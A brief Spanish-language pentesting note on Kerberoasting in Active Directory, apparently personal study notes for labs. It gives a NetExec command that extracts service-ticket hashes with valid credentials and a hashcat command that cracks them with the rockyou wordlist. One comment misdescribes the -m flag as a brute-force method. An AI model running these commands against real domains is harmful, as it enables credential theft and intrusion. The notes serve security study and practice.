# Kerberoasting 

Tags: #AD #Kerberoasting #Parrot #Kali #HashCat 

## Obtener Hash con CrackMapExec

```bash 
❯ nxc ldap IP -u 'user' -p 'Password' --kerberoast output.txt

Nota: 
	1. Tener la IP con el dominio en '/etc/hosts'
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 13100 = TGS de un Kerberoasting
	# hash-kerberoasting = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```